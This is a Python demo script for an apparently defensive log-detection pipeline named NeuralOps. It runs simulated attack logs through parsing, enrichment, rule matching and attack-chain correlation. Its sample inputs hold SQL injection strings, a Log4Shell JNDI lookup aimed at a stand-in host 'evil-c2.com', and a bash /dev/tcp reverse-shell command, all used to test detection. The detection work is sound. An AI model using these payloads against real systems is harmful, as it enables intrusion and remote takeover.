#!/usr/bin/env python3
"""
NeuralOps — Full Pipeline Demo
Shows every layer from attack injection to final alert output.
No Redis needed — pure local demonstration.
"""

import sys, os, json, time
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from engine.parsers import normalize_log
from engine.enricher import GeoEnricher
from engine.matchers import match_rule
from engine.scorer import compute_confidence
from engine.baseline import baseline
from engine.correlator import get_correlator
from engine.rules import get_rules

RULES_BY_NAME = {r["name"]: r for r in get_rules()}
enricher = GeoEnricher()  # graceful — no DB = no enrichment

def simulate_attack(name: str, raw_log: dict):
    print(f"\n{'='*70}")
    print(f" SCENARIO: {name}")
    print(f"{'='*70}")

    # Step 1: Raw log enters the pipeline
    print(f"\n[1] RAW LOG ENTERS REDIS STREAM")
    print(f"    neuralops:logs <- {json.dumps(raw_log, indent=4)}")
    time.sleep(0.3)

    # Step 2: Normalization + decoding
    print(f"\n[2] PARSER LAYER — normalize, decode, extract")
    norm = normalize_log(raw_log)
    if norm["decoded_variants"]:
        print(f"    Decoded variants: {norm['decoded_variants']}")
    if norm["b64_decoded"]:
        print(f"    Base64 decoded:   {norm['b64_decoded']}")
    time.sleep(0.3)

    # Step 3: GeoIP enrichment
    print(f"\n[3] ENRICHMENT LAYER — GeoIP lookup")
    enricher.enrich(norm)
    geo = norm.get("geo", {})
    if geo and geo.get("country"):
        print(f"    Country: {geo['country']} | City: {geo['city']} | ISP: {geo['isp']}")
    elif not geo.get("is_private"):
        print(f"    GeoIP DB not loaded — enrichment skipped (country field not available)")
    else:
        print(f"    Private IP — no enrichment needed")
    time.sleep(0.3)

    # Step 4: Baseline observation
    print(f"\n[4] BEHAVIORAL LAYER — IP baseline profiling")
    baseline.observe(norm)
    ba_score = baseline.score(norm)
    if ba_score > 0:
        print(f"    Behavioral anomaly score: {ba_score:.3f} (unusual method/UA/rate)")
    else:
        print(f"    Behavioral baseline: normal (no anomaly)")
    time.sleep(0.3)

    # Step 5: Rule matching
    print(f"\n[5] DETECTION ENGINE — 63 rules scanned")
    best_alert = None
    for rule in get_rules():
        raw_score, matched = match_rule(rule, norm)
        if raw_score <= 0:
            continue
        ci = compute_confidence(raw_score, rule, norm)
        if ci["score"] < 0.15:
            continue
        print(f"    MATCH: {rule['name']:30s} raw={raw_score:.3f} confidence={ci['score']:.3f} [{ci['severity']}]")
        print(f"           matched: {matched[:80]}")

        if best_alert is None or ci["score"] > best_alert["confidence"]:
            best_alert = {
                "id": "demo-" + str(uuid.uuid4())[:8],
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "rule_name": rule["name"],
                "category": rule.get("category", "unknown"),
                "severity": ci["severity"],
                "ttp": rule["ttps"][0] if rule.get("ttps") else "T1078",
                "kill_chain": rule.get("kill_chain", "Unknown"),
                "source_ip": norm["flat"].get("source_ip", norm["flat"].get("src_ip", "unknown")),
                "matched_value": matched[:200],
                "confidence": ci["score"],
                "description": f"{rule['name']} detected",
                "geo": norm.get("geo", {}),
                "boost_factors": ci.get("factors", []),
            }
    time.sleep(0.3)

    # Step 6: Alert output
    print(f"\n[6] FINAL ALERT — emitted to neuralops:alerts")
    if best_alert:
        print(f"    {json.dumps(best_alert, indent=4)}")
    else:
        print(f"    No alert generated (below confidence threshold)")
    time.sleep(0.3)

import uuid

def simulate_chain():
    print(f"\n{'#'*70}")
    print(f" ATTACK CHAIN CORRELATION DEMO")
    print(f"{'#'*70}")
    print(f"\nSimulating multi-stage attack from same IP 10.0.0.99:")
    print(f"  Stage 1: Dir busting (recon)")
    print(f"  Stage 2: SQL injection (web exploit)")
    print(f"  Stage 3: Webshell upload (malware install)")

    corr = get_correlator()

    stage1 = {"source_ip": "10.0.0.99", "url": "/admin", "status": "404"}
    print(f"\n  >> Stage 1: Dir busting -> /admin (404)")
    norm = normalize_log(stage1)
    bas = 1.0
    for rule in get_rules():
        if rule["name"] == "Dir Busting":
            bas = rule["base_score"] / 100.0
            break
    corr.record({"rule_name": "Dir Busting", "category": "recon", "source_ip": "10.0.0.99", "confidence": bas})

    time.sleep(0.3)
    stage2 = {"source_ip": "10.0.0.99", "url": "/products?id=1'+OR+'1'='1", "status": "200"}
    print(f"  >> Stage 2: SQLi -> /products?id=1'+OR+'1'='1")
    norm = normalize_log(stage2)
    corr.record({"rule_name": "SQL Injection", "category": "web", "source_ip": "10.0.0.99", "confidence": 0.7})

    time.sleep(0.3)
    stage3 = {"source_ip": "10.0.0.99", "url": "/upload", "body": "filename=shell.php", "status": "200"}
    print(f"  >> Stage 3: Webshell upload -> /upload shell.php")
    norm = normalize_log(stage3)
    corr.record({"rule_name": "Webshell Upload", "category": "malware", "source_ip": "10.0.0.99", "confidence": 0.85})

    time.sleep(0.3)
    boost = corr.get_boost("10.0.0.99")
    print(f"\n  >> Chain boost applied: +{boost:.2f} confidence to all subsequent alerts")
    if boost > 0:
        print(f"  >> Detected chain: Recon -> Web Exploit -> Malware Install")
        print(f"  >> This chain matches MITRE ATT&CK: Recon (T1046) -> Exploit (T1190) -> Install (T1505)")

def main():
    print(json.dumps({
        "project": "NeuralOps — AI Security Operations Center",
        "version": "2.0",
        "total_rules": len(get_rules()),
        "engine_modules": ["parsers", "enricher", "matchers", "scorer", "baseline", "correlator", "dedup", "feedback", "persistence", "loader"],
        "workers": ["rule_engine", "ml_anomaly", "threat_intel", "output"],
    }, indent=2))

    # Single attack scenarios
    simulate_attack("SQL Injection — Attacker tries to bypass login",
        {"source_ip": "203.0.113.42", "method": "GET",
         "url": "/login?user=admin&pass=1'+OR+'1'='1'--",
         "status": "200", "user_agent": "sqlmap/1.7"})

    time.sleep(1)

    simulate_attack("Log4Shell — Attacker exploits vulnerable app",
        {"source_ip": "198.51.100.7", "method": "GET", "url": "/",
         "user_agent": "${jndi:ldap://evil-c2.com:1389/a}",
         "status": "200"})

    time.sleep(1)

    simulate_attack("Reverse Shell — Attacker establishes C2",
        {"source_ip": "192.0.2.88", "method": "POST",
         "url": "/cgi-bin/exec",
         "body": "cmd=bash -i >& /dev/tcp/192.0.2.99/4444 0>&1",
         "status": "200"})

    time.sleep(1)

    simulate_chain()

    print(f"\n{'='*70}")
    print(f" FINAL PRODUCT SUMMARY")
    print("=" * 70)
    print(" FINAL PRODUCT SUMMARY")
    print("=" * 70)
    print("""
  INPUT                        PROCESSING                      OUTPUT
  ---------------------------------------------------------------------------
  HTTP logs (middleware)       Normalize + decode + enrich     neuralops:alerts
  nginx/auth.log (filetail)   63 rules matched                  { id, timestamp,
  Network packets (scapy)     Confidence scored (0.0-1.0)        rule_name, severity,
  Journald events             Baseline check (IP profiling)      ttp, source_ip,
                               Chain correlation (multi-stage)   matched_value,
                               Dedup + group into incidents      confidence, geo,
                               FP feedback suppression           description }
                               Threat intel enrichment          neuralops:incidents
                               ML anomaly detection              { grouped alerts }
                               Output adapter                   /tmp/neuralops_alerts.log
  10k logs/hour -> ~10 alerts 2872 lines of engine              Optional: Slack
    """)

if __name__ == "__main__":
    main()
